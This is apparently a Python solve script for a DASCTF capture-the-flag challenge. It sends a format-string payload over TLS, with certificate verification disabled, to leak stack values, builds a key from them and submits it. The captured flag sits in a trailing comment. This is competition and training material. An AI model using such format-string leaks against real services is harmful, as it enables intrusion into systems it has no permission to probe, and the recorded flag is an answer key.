import re, socket, ssl

HOST = "8ba95fb6e79075b4041aad77.tcp-ctf2.dasctf.com"
PORT = 9999

def connect():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((HOST, PORT), timeout=15)
    ss = ctx.wrap_socket(raw, server_hostname=HOST)   # TLS 必须带 SNI
    ss.settimeout(6)
    return ss

def rx(ss, idle=1.0):
    buf = b""
    ss.settimeout(idle)
    while True:
        try:
            d = ss.recv(65536)
            if not d:
                break
            buf += d
        except socket.timeout:
            break
    return buf.decode("utf-8", "replace")

ss = connect()
rx(ss, 1.5)                                   # 吃掉 banner

# 1) 连续读 7 个槽位（不能有缺口，否则 glibc 报 gap）
q = "|".join("%%%d$p" % i for i in range(1, 8))
ss.sendall((q + "\n").encode())
out = rx(ss, 1.2)

vals = [int(v, 16) for v in re.findall(r"0x[0-9a-fA-F]{16}", out)]
assert len(vals) == 7
assert vals[0] == 0xDEADBEEF and vals[3] == 0xC0FFEE00   # 诱饵自检，确认栈布局未变

# 2) 取 slot5 / slot6 的低 32 位拼成 16 位十六进制
key = "%08x%08x" % (vals[4] & 0xFFFFFFFF, vals[5] & 0xFFFFFFFF)

# 3) 同一连接内提交
ss.sendall((key + "\n").encode())
print(rx(ss, 1.3))
# CTF2{3f8808d2-685b-4178-a5fd-48181c0d58c2}